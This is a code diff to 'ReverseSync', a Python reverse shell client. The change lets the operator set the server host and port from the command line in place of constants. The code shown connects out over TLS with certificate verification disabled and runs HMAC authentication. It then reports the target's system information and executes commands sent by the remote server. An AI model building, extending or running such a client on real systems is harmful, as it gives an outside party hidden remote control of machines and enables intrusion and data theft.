@@ -1,3 +1,4 @@
+import argparse
 import asyncio
 import base64
 import getpass
@@ -12,9 +13,36 @@ from asyncio import CancelledError, IncompleteReadError
 from pathlib import Path
 from sysInfo import TargetSysInfo
 
-# Configuration: Server address and port for the reverse shell connection
-SERVER_HOST = '127.0.0.1'
-SERVER_PORT = 1234
+def parse_arguments():
+    """
+    Parses command-line arguments for the ReverseShellClient.
+
+    Returns:
+        argparse.Namespace: Parsed arguments with default values set.
+    """
+    parser = argparse.ArgumentParser(
+        prog="reversync-client",
+        description=(
+            "ReverseSync Client - A secure asynchronous Python reverse shell client.\n"
+            "Connects to a remote server over TLS, performs HMAC auth, and executes commands."
+        ),
+        epilog="Example: python client.py --host 192.168.1.10 --port 443"
+    )
+
+    parser.add_argument(
+        '--host', '-H',
+        default='127.0.0.1',
+        help='Server IP address to connect to (default: 127.0.0.1)'
+    )
+
+    parser.add_argument(
+        '--port', '-p',
+        type=int,
+        default=1234,
+        help='Server port to connect to (default: 1234)'
+    )
+
+    return parser.parse_args()
 
 
 def resolve_path(path: str) -> str:
@@ -33,11 +61,13 @@ class ReverseShellClient:
     Reverse shell client that connects to a server and executes shell commands remotely.
     """
 
-    def __init__(self):
+    def __init__(self,SERVER_HOST,SERVER_PORT):
         self.reader = None
         self.writer = None
         self.current_directory = os.getcwd()
         self.client_info = TargetSysInfo()
+        self.SERVER_HOST = SERVER_HOST
+        self.SERVER_PORT = SERVER_PORT
 
     async def perform_hmac_authentication(self) -> bool:
         """
@@ -171,15 +201,15 @@ class ReverseShellClient:
             ssl_ctx = ssl.create_default_context()
             ssl_ctx.check_hostname = False
             ssl_ctx.verify_mode = ssl.CERT_NONE
-            self.reader, self.writer = await asyncio.open_connection(SERVER_HOST,
-                                                                     SERVER_PORT,
+            self.reader, self.writer = await asyncio.open_connection(self.SERVER_HOST,
+                                                                     self.SERVER_PORT,
                                                                      ssl=ssl_ctx
                                                                      )
             auth = await self.perform_hmac_authentication()
             if not auth:
-                print(f"[-] Connection refused by {SERVER_HOST}:{SERVER_PORT}")
+                print(f"[-] Connection refused by {self.SERVER_HOST}:{self.SERVER_PORT}")
                 return None
-            print(f"[+] Connected to reverse shell server at {SERVER_HOST}:{SERVER_PORT}")
+            print(f"[+] Connected to reverse shell server at {self.SERVER_HOST}:{self.SERVER_PORT}")
             await self.send_output(self.setup_data(stdout=self.client_info.__str__()).strip())
 
             while True:
@@ -191,7 +221,7 @@ class ReverseShellClient:
                 command = data['cmd'].strip()
 
                 if not command:
-                    print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
+                    print(f"[-] Connection closed by {self.SERVER_HOST}:{self.SERVER_PORT}")
                     self.writer.close()
                     await self.writer.wait_closed()
                     break
@@ -257,16 +287,19 @@ class ReverseShellClient:
         except ConnectionResetError as e:
             print(e)
         except IncompleteReadError as e:
-            print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
+            print(f"[-] Connection closed by {self.SERVER_HOST}:{self.SERVER_PORT}")
         except OSError:
-            print(f"[-] Connect call failed {SERVER_HOST}:{SERVER_PORT}")
+            print(f"[-] Connect call failed {self.SERVER_HOST}:{self.SERVER_PORT}")
 
 
 async def main():
     """
     Entry point for the asynchronous reverse shell client.
     """
-    client = ReverseShellClient()
+    args = parse_arguments()
+    SERVER_HOST = args.host
+    SERVER_PORT = args.port
+    client = ReverseShellClient(SERVER_HOST,SERVER_PORT)
     await client.connect_and_listen()
 
 
